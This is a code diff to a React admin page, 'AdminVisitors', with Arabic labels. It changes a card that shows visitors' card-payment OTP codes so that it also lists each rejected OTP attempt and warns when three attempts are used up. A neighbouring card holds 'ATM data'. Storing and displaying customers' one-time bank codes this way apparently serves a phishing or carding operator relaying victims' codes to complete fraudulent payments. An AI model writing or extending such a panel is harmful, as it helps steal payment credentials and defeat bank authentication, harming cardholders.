@@ -1920,24 +1920,49 @@ const AdminVisitors = () => {
                                 })()}
 
                                 {/* 2. كود OTP الدفع بالبطاقة */}
-                                <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600">
-                                    <div className="px-3 py-2.5">
-                                      {order.otp_code ? (
-                                        <div className="flex items-center justify-center py-2">
-                                          <span className="text-2xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{order.otp_code}</span>
-                                        </div>
-                                      ) : (
-                                        <p className="text-[10px] text-muted-foreground text-center py-2">لا توجد بيانات</p>
-                                      )}
-                                      {order.otp_verified !== null && (
-                                        <div className="flex justify-center mt-1">
-                                          <span className={`text-[9px] px-2 py-0.5 rounded-full ${order.otp_verified ? "bg-emerald-500/15 text-emerald-600" : "bg-red-500/15 text-red-600"}`}>
-                                            {order.otp_verified ? "✓ تم التحقق" : "✗ لم يتم التحقق"}
-                                          </span>
-                                        </div>
-                                      )}
-                                    </div>
-                                </CollapsibleCard>
+                                {(() => {
+                                  const otpEvents = stageEvents
+                                    .filter(e => e.order_id === order.id && e.stage === "otp")
+                                    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+                                  const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
+                                  const currentOtp = order.otp_code;
+                                  return (
+                                    <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600">
+                                      <div className="px-3 py-2.5 space-y-2">
+                                        {rejectedOtps.length > 0 && (
+                                          <div className="space-y-1.5">
+                                            {rejectedOtps.map((ev, i) => {
+                                              const code = (ev.payload as any)?.otp_code || (ev.payload as any)?.code || "—";
+                                              return (
+                                                <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5">
+                                                  <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
+                                                  <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{code}</span>
+                                                </div>
+                                              );
+                                            })}
+                                          </div>
+                                        )}
+                                        {currentOtp ? (
+                                          <div className="flex items-center justify-center py-2">
+                                            <span className="text-2xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{currentOtp}</span>
+                                          </div>
+                                        ) : (
+                                          <p className="text-[10px] text-muted-foreground text-center py-2">لا توجد بيانات</p>
+                                        )}
+                                        {order.otp_verified !== null && (
+                                          <div className="flex justify-center mt-1">
+                                            <span className={`text-[9px] px-2 py-0.5 rounded-full ${order.otp_verified ? "bg-emerald-500/15 text-emerald-600" : "bg-red-500/15 text-red-600"}`}>
+                                              {order.otp_verified ? "✓ تم التحقق" : "✗ لم يتم التحقق"}
+                                            </span>
+                                          </div>
+                                        )}
+                                        {rejectedOtps.length >= 3 && (
+                                          <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
+                                        )}
+                                      </div>
+                                    </CollapsibleCard>
+                                  );
+                                })()}
 
                                 {/* 3. ATM */}
                                 <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600">
